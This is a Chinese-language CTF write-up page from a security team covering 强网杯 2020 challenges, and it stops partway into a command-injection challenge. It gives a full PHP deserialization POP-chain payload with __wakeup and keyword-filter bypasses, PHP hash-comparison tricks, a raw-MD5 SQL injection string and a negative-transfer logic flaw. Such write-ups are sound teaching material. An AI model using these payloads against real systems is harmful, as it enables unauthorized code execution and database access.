<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>r00t 强网杯 2020 | r00t信息安全战队</title>
    <meta name="generator" content="VuePress 1.9.9">
    
    <meta name="description" content="分享 | 求知 | 提升">
    
    <link rel="preload" href="/assets/css/0.styles.e8e4f3a3.css" as="style"><link rel="preload" href="/assets/js/app.1eac7796.js" as="script"><link rel="preload" href="/assets/js/2.da4aa226.js" as="script"><link rel="preload" href="/assets/js/31.6a66925e.js" as="script"><link rel="prefetch" href="/assets/js/10.6818eed9.js"><link rel="prefetch" href="/assets/js/11.c5844bad.js"><link rel="prefetch" href="/assets/js/12.54862c7d.js"><link rel="prefetch" href="/assets/js/13.dd8c8750.js"><link rel="prefetch" href="/assets/js/14.617bb0c2.js"><link rel="prefetch" href="/assets/js/15.f27cce8c.js"><link rel="prefetch" href="/assets/js/16.979d9069.js"><link rel="prefetch" href="/assets/js/17.97839523.js"><link rel="prefetch" href="/assets/js/18.55f9e085.js"><link rel="prefetch" href="/assets/js/19.0b3f3b95.js"><link rel="prefetch" href="/assets/js/20.23bc5ab1.js"><link rel="prefetch" href="/assets/js/21.af5f5ba5.js"><link rel="prefetch" href="/assets/js/22.f640f616.js"><link rel="prefetch" href="/assets/js/23.f69547ef.js"><link rel="prefetch" href="/assets/js/24.6e00637a.js"><link rel="prefetch" href="/assets/js/25.6fb26861.js"><link rel="prefetch" href="/assets/js/26.c2d2abef.js"><link rel="prefetch" href="/assets/js/27.cb617287.js"><link rel="prefetch" href="/assets/js/28.639cddd1.js"><link rel="prefetch" href="/assets/js/29.1c62d8ae.js"><link rel="prefetch" href="/assets/js/3.0f769c09.js"><link rel="prefetch" href="/assets/js/30.7cbff6e2.js"><link rel="prefetch" href="/assets/js/32.d8004455.js"><link rel="prefetch" href="/assets/js/33.8ec69a13.js"><link rel="prefetch" href="/assets/js/34.4a42a1bd.js"><link rel="prefetch" href="/assets/js/4.ddc6d2f6.js"><link rel="prefetch" href="/assets/js/5.175964b3.js"><link rel="prefetch" href="/assets/js/6.da13883d.js"><link rel="prefetch" href="/assets/js/7.0de84f15.js"><link rel="prefetch" href="/assets/js/8.c6432f97.js"><link rel="prefetch" href="/assets/js/9.72c27c98.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e8e4f3a3.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">r00t信息安全战队</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>r00t 强网杯 2020</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/writeup/2020-qwb.html#签到" class="sidebar-link">签到</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-qwb.html#web-辅助" class="sidebar-link">web 辅助</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-qwb.html#bank" class="sidebar-link">bank</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-qwb.html#funhash" class="sidebar-link">Funhash</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-qwb.html#upload" class="sidebar-link">upload</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-qwb.html#主动" class="sidebar-link">主动</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-qwb.html#侧防" class="sidebar-link">侧防</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-qwb.html#红方辅助" class="sidebar-link">红方辅助</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-qwb.html#问卷调查" class="sidebar-link">问卷调查</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-qwb.html#imitation-game" class="sidebar-link">imitation_game</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/writeup/2020-qwb.html#程序逻辑" class="sidebar-link">程序逻辑</a></li><li class="sidebar-sub-header"><a href="/writeup/2020-qwb.html#解题过程" class="sidebar-link">解题过程</a></li></ul></li><li><a href="/writeup/2020-qwb.html#xx-warmup-obf" class="sidebar-link">xxwarmupobf</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/writeup/2020-qwb.html#程序逻辑-2" class="sidebar-link">程序逻辑</a></li><li class="sidebar-sub-header"><a href="/writeup/2020-qwb.html#做题过程" class="sidebar-link">做题过程</a></li></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="r00t-强网杯-2020"><a href="#r00t-强网杯-2020" class="header-anchor">#</a> r00t 强网杯 2020</h1> <p>急缺pwn师傅</p> <h2 id="签到"><a href="#签到" class="header-anchor">#</a> 签到</h2> <p>flag{welcome_to_qwb_S4}</p> <h2 id="web-辅助"><a href="#web-辅助" class="header-anchor">#</a> web 辅助</h2> <p>下载源码进行审计，发现是反序列化</p> <p>先找 POP 链，在 class 中可以构造出完整的链子</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">&quot;common.php&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">player</span><span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$user</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">user</span> <span class="token operator">=</span> <span class="token variable">$user</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pass</span> <span class="token operator">=</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">topsolo</span><span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Riven'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">midsolo</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">jungle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">TP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">&quot;function&quot;</span> <span class="token keyword">or</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">&quot;object&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>
            <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">TP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">midsolo</span><span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;No Yasuo! No Soul!\n&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">Gank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Gank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Are you orphan?\n&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Must Be Yasuo!\n&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">jungle</span><span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;Lee Sin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">KS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;cat /flag&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">KS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token variable">$player</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">player</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;1&quot;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$player</span><span class="token operator">-&gt;</span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">topsolo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$player</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br></div></div><p>这里<code>__wakeup</code>需要绕一绕，参考 CVE-2016-7124，当成员属性数目大于实际数目时，__wakeup 不会执行</p> <p>第二个点是过 check 函数</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'name'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Name Pass\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>这个要求序列化后的数据里不能出现 name，这里可以用<code>S</code>的类型绕过，将<code>s:4:&quot;name&quot;</code>转换成<code>S:4:&quot;\6eame&quot;</code>，即可绕过检查</p> <p>最后一个点是反序列化逃逸</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0*\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;*&quot;</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;*&quot;</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0*\0'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>又是喜闻乐见的修改序列化数据，如果在序列化之前加入一个<code>\0*\0</code>，在经过 read 函数时就会被解码缩小，但是我们一般的反序列化逃逸是通过膨胀实现的，在仔细观察后，发现他有 user、pass 两个输入点，所以可以在 user 字段中添加<code>\0*\0</code>，导致 user 字段收缩，吃掉后面的 pass 定义，把我构造的序列化数据露出来</p> <p>最后的 paylaod</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>O:6:&quot;player&quot;:3:{s:7:&quot;\0*\0user&quot;;s:56:&quot;\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\&quot;;s:7:&quot;\0*\0pass&quot;;s:134:&quot;;s:4:&quot;test&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\0*\0\6eame&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\0*\0\6eame&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\0*\0\6eame&quot;;s:7:&quot;Lee Sin&quot;;}}}}&quot;;s:8:&quot;\0*\0admin&quot;;i:0;}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="bank"><a href="#bank" class="header-anchor">#</a> bank</h2> <p>开始是一个 PoW，爆就完事儿了</p> <p>输入用户名，之后能转账、查看记录、接收记录、查看 hint</p> <p>根据 hint</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">transact_ecb</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> sender<span class="token punctuation">,</span> receiver<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>
    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>
    ct <span class="token operator">=</span> <span class="token string">b&quot;&quot;</span>
    ct <span class="token operator">+=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>sender<span class="token punctuation">)</span>
    ct <span class="token operator">+=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>receiver<span class="token punctuation">)</span>
    ct <span class="token operator">+=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>amount<span class="token punctuation">)</span>
    <span class="token keyword">return</span> ct
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>他将数据逐个加密，拼接成一个整体，那么应该可以将自己的名字设置为 1000，然后将<code>sender</code>那个块放在<code>amount</code>的位置，应该可以实现转账一个很大的数</p> <p>但是这么操作并没有成功，实际上，连正常的转账都没能成功。。。</p> <p>后来发现可以转一个负数，转账-1000，本题终结</p> <h2 id="funhash"><a href="#funhash" class="header-anchor">#</a> Funhash</h2> <p>第一层，md4 等于自身，只要又一个 0e 开头的字符串算的 md4 也是 0e 开头就行了</p> <p>找到一个<code>0e251288019</code></p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;hash1&quot;</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;md4&quot;</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;hash1&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'level 1 failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>第二层，两个变量本身不相等，但是 md5 相等</p> <p>让他们是不同的数组就可以了</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash2'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash3'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'level 2 failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>第三层，让一个东西的 md5，带着 sql 注入语句</p> <p>找到一个<code>ffifdyop</code>，算 md5 会得到，<code>'or'</code></p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT * FROM flag WHERE password = '&quot;</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;hash4&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;'&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h2 id="upload"><a href="#upload" class="header-anchor">#</a> upload</h2> <p>附件是一个流量包，里面是一个 HTTP 流量，导出之后是一张图片，文件名是 steghide 解，试一下密码 123456，成功解出 flag</p> <h2 id="主动"><a href="#主动" class="header-anchor">#</a> 主动</h2> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;index.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/flag/i&quot;</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;ip&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
